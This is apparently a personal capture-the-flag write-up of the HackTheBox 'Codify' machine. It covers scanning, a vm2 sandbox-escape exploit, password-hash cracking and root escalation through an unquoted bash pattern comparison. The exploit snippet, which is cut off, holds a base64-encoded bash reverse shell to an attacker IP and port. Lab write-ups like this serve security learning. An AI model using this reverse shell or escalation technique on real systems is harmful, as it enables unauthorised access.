codify
run nmap command 
nmap -A -T5 10.10.11.239 --min-rate=500 -p-

  
from the results for port 80 , i added codify.htb to the /etc/hosts

checking for searchsploit for apache httpd version

nikto results

nothing interesting on nikto results.
moving on to the website
port 80 and 3000 have same websites


from about us found the version of vm2 used.

this particular software was disabled due to security issues so this version could also possibly have some potential for RCE

modules allowed
found exploit on exploit-db
https://www.exploit-db.com/exploits/51898
i was not able to get a reverse shell with a simple bash command so i used a base64 encoded shell
final exploit
const { VM } = require("vm2");
const vm = new VM();
const command = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yOC80NDQ0IDA+JjEK |base64 -d| bash "; // Change to the desired command
const code = `
async function fn() {
(function stack() {
new Error().stack;
stack();
})();
}
try {
const handler = {
getPrototypeOf(target) {
(function stack() {
new Error().stack;
stack();
})();
}
};
reverse shell as codify

this was not the user with user.txt flag, there wass another user joshua
downloaded linenum with curl

on kali

only interesting thing was this db running on 3306 - a port forwarde attempt was unsuccessful ( couldnt really test it without credentials anyway)

but no credentials were present for it
there were no interesting passwords or credentials or files in home directory either
going to /var/www since that is usually where web server files are contained

editor was the service through which we gained access, nothing interesting in it sfiles so switching to contact
found index.js

now nothing is running on port 3000 or 3001 internally or externally so couldnt do much with hardcoded session data
although an sqlite database tickets.db was running
you can access sqlite database without creds(shell should be upgraded)

user joshua’s password

using john to crack it

login to joshua with ssh and sudo -l

found mysql backup, viewing contents

to run the file logic is that when in bash script if comparison is done iinside [[ ]] and the right side is not in quotes it treated not as string but pattern. so * would be bypass the actual password
to observe the commands run during the process we used pspy(referred 0xdf)
github.com​
download with curl and run

running the script

password in pspy

switching with su to root

this was a machine with relatively easy initial access although switching to joshua was a bit tricky because enumerating folders to reach the right conclusion is slightly vague and can take a lot of time if not looking in the right spot. escalation to root was easy but because i wasnt aware of pspy it took me referring walkthroughs to finish.
